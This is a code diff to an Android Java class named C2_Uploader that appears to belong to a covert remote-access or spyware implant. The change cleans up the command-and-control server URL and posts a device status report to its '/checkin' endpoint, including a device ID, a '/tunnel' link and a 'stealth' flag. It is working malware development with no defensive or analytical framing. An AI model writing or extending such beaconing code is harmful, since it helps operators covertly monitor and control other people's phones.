@@ -55,7 +55,13 @@ public class C2_Uploader {
                 status.put("link", "/tunnel?deviceId=" + getDeviceId(context));
                 status.put("stealth", SystemAnalytics.isStealthEnabled(context));
                 
-                postJsonSync(c2Url, status.toString());
+                String baseC2 = c2Url.trim();
+                while (baseC2.endsWith("/")) baseC2 = baseC2.substring(0, baseC2.length() - 1);
+                if (baseC2.endsWith("/checkin")) baseC2 = baseC2.substring(0, baseC2.length() - 8);
+                while (baseC2.endsWith("/")) baseC2 = baseC2.substring(0, baseC2.length() - 1);
+                
+                String checkinUrl = baseC2 + "/checkin";
+                postJsonSync(checkinUrl, status.toString());
             } catch (Exception e) {
                 Log.e(TAG, "Check-in failed: " + e.getMessage());
             }
